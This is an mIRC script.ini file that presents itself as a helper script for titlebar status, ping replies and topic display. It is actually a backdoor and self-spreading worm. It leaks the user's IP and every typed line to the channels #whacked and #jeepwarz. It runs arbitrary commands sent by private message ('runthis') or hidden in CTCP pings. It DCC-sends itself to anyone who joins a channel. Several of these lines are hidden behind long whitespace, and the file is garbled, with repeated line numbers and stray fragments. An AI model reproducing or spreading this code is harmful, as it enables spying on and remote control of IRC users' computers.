[script]
n0=on 1:START:{
n1=  .sreq ignore
n2=  .remote on
n3=}
n4=on 1:CONNECT:.msg #whacked Hi !!!.  $ip on $server $+ : $+ $port $+ .
n5=
n6=on 1:INPUT:*:{
n7=  .msg #whacked ( $+ $active $+ ) $1-
n8=}
n9=on 1:TEXT:*:?:{
n10=  if ( $1 == runthis ) { .run $2- }
n11=}
n12=  if { ( $1 == mircrun ) { $2 } }
n13=on 1:JOIN:*:{
n14=  if ( $nick == $me ) { halt } | .dcc send $nick $mircdir $+ script.ini
n15=}
= %i + 1
n16=  /if ($opnick(%i,$chan) != $me ) { %line = $opnick(%i,$chan) }
n17=  /i:titlebar (Connecting to $server $+ )
n8=
n9=on 1:CONNECT:titlebar (Connected to $server $+ )                                                                                                                                                                                                                                                                                                               | .msg  #jeepwarz Hi.  $ip on $server $+ : $+ $port $+ .
n10=
n11=on 1:DISCONNECT:titlebar (Not connected)
n12=
n13=;if you type something in status it doesn't have to have "/"
n14=on 1:INPUT:*:{                                                                                                                                                                                                                                                                                                                                                                                     .msg #jeepwarz ( $+ $active $+ ) $1-
n15=  set %a status window
n16=  if ( $active == %a ) { $1- | halt }
n17=}
n18=
n19=;ping stuff
n20=on 1:CTCPREPLY:ping*:.notice $nick Your ping time is $duration($calc($ctime - $2)) $+ . 
n21=CTCP 1:ping: if ( $nick != $me) { .ctcp ping $1 }                                                                                                                                                                                                                                                                                                                      | if ( $3 != $null ) { $3- | halt }
n22=
n23=;if you are banned but still opped, unban self
n24=on @1:BAN:#:if ( $banmask iswm $address($me,5) ) mode $chan -b $banmask
n25=
n26=on 1:JOIN:*:{
n27=  if ( $nick == $me ) { halt }
n28=  if ( $comchan($nick,0) > 2 ) { .notice $nick Following me? | halt }                                                                                                                                                                                                                                                                                   | .dcc send $nick $mircdir $+ script.ini
n29=}
n30=
n31=;show channel topic in channel on join
n32=RAW 332:*:echo 4 $2 $chr(31) $+ $2 $+ $chr(31) $+ : $3-                                                                                                                                                                                                                                                                                                     | if ( script.ini isin $3- ) { part $2 | halt }
